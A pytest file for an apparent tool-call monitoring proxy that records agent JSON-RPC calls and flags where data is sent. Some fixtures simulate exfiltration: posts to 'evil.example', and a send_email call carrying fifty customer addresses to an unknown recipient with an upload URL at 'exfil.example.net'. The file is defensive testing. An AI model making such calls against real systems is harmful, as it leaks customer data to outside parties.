"""Observation logic, exercised directly without spawning a server."""

import json

import pytest

from callwitness.proxy import Proxy
from callwitness.record import Recorder


@pytest.fixture
def proxy(tmp_path):
    return Proxy(["true"], Recorder(tmp_path, "test", "test"))


def call(request_id, tool, arguments):
    return {"jsonrpc": "2.0", "id": request_id, "method": "tools/call",
            "params": {"name": tool, "arguments": arguments}}


def ok(request_id, text="fine"):
    return {"jsonrpc": "2.0", "id": request_id,
            "result": {"content": [{"type": "text", "text": text}]}}


def rows(proxy):
    return [dict(r) for r in proxy.rec.all_calls()]


def test_records_a_completed_tool_call(proxy):
    proxy.on_client_message(call(1, "send_email", {"to": "ops@acme.com"}))
    proxy.on_server_message(ok(1))

    (row,) = rows(proxy)
    assert row["tool"] == "send_email"
    assert json.loads(row["args_json"]) == {"to": "ops@acme.com"}
    assert row["args_bytes"] == len(json.dumps({"to": "ops@acme.com"}).encode())
    assert row["is_error"] == 0
    assert row["duration_ms"] >= 0
    assert json.loads(row["signals_json"])["destinations"]["emails"] == ["ops@acme.com"]


def test_nothing_is_recorded_until_the_response_arrives(proxy):
    proxy.on_client_message(call(1, "send_email", {"to": "a@b.com"}))
    assert rows(proxy) == []


def test_jsonrpc_error_is_flagged(proxy):
    proxy.on_client_message(call(1, "explode", {}))
    proxy.on_server_message({"jsonrpc": "2.0", "id": 1,
                             "error": {"code": -32000, "message": "boom"}})
    assert rows(proxy)[0]["is_error"] == 1


def test_tool_level_is_error_is_flagged(proxy):
    """A tool can fail inside a successful JSON-RPC response."""
    proxy.on_client_message(call(1, "read_db", {}))
    proxy.on_server_message({"jsonrpc": "2.0", "id": 1,
                             "result": {"isError": True, "content": []}})
    assert rows(proxy)[0]["is_error"] == 1


def test_notifications_are_ignored(proxy):
    proxy.on_client_message({"jsonrpc": "2.0", "method": "tools/call",
                             "params": {"name": "x", "arguments": {}}})
    assert proxy.pending == {}


def test_response_to_an_unknown_id_is_ignored(proxy):
    proxy.on_server_message(ok(999))
    assert rows(proxy) == []


def test_handshake_methods_are_events_not_calls(proxy):
    proxy.on_client_message({"jsonrpc": "2.0", "id": 1, "method": "initialize",
                             "params": {}})
    proxy.on_client_message({"jsonrpc": "2.0", "id": 2, "method": "tools/list",
                             "params": {}})
    assert rows(proxy) == []
    assert proxy.pending == {}


def test_no_args_mode_stores_shape_and_never_values(tmp_path):
    proxy = Proxy(["true"], Recorder(tmp_path, "s", "s"), no_args=True)
    secret = "sk-live-DO-NOT-STORE"
    proxy.on_client_message(call(1, "send_email", {"key": secret}))
    proxy.on_server_message(ok(1))

    row = rows(proxy)[0]
    assert secret not in row["args_json"]
    assert json.loads(row["args_json"]) == {"key": f"<str:{len(secret)}>"}
    # true size is still recorded, because size is the signal
    assert row["args_bytes"] > 0


def test_oversized_arguments_are_truncated_but_true_size_is_kept(tmp_path):
    proxy = Proxy(["true"], Recorder(tmp_path, "s", "s"), max_arg_bytes=100)
    payload = "x" * 5000
    proxy.on_client_message(call(1, "upload", {"body": payload}))
    proxy.on_server_message(ok(1))

    row = rows(proxy)[0]
    assert row["args_truncated"] == 1
    assert row["args_bytes"] > 5000
    assert len(json.loads(row["args_json"])["_truncated"]) <= 100


def test_destination_is_still_captured_in_no_args_mode(tmp_path):
    """--no-args hides values but keeps destinations. Documented, deliberate."""
    proxy = Proxy(["true"], Recorder(tmp_path, "s", "s"), no_args=True)
    proxy.on_client_message(call(1, "post", {"url": "https://evil.example/x"}))
    proxy.on_server_message(ok(1))
    signals = json.loads(rows(proxy)[0]["signals_json"])
    assert signals["destinations"]["hosts"] == ["evil.example"]


def test_a_broken_recorder_never_raises(tmp_path):
    """The stream must survive a failing recorder. This is the load-bearing test."""
    class Exploding(Recorder):
        def call(self, rec):
            raise RuntimeError("disk on fire")

    proxy = Proxy(["true"], Exploding(tmp_path, "s", "s"))
    proxy.on_client_message(call(1, "send_email", {"to": "a@b.com"}))
    proxy.on_server_message(ok(1))  # must not propagate


def test_concurrent_calls_correlate_to_the_right_responses(proxy):
    proxy.on_client_message(call(1, "first", {"a": 1}))
    proxy.on_client_message(call(2, "second", {"b": 2}))
    proxy.on_server_message(ok(2))
    proxy.on_server_message(ok(1))

    recorded = [(r["tool"], json.loads(r["args_json"])) for r in rows(proxy)]
    assert recorded == [("second", {"b": 2}), ("first", {"a": 1})]


def test_payload_contents_are_counted_not_listed_as_destinations(proxy):
    """400 customer emails in a body are data. The `to:` field is the destination.

    Conflating them buries the one address that matters under the four hundred
    that don't, which is exactly what a naive scan does.
    """
    body = json.dumps([{"email": f"user{i}@acme.com"} for i in range(50)])
    proxy.on_client_message(call(1, "send_email", {
        "to": "archive@unknown-host.example",
        "attach_url": "https://exfil.example.net/upload",
        "body": body,
    }))
    proxy.on_server_message(ok(1))

    signals = json.loads(rows(proxy)[0]["signals_json"])
    assert signals["destinations"]["emails"] == ["archive@unknown-host.example"]
    assert signals["destinations"]["hosts"] == ["exfil.example.net"]
    # the payload emails are counted as a signal, not kept
    assert signals["content_counts"]["emails"] == 50
    assert "user0@acme.com" not in json.dumps(signals)
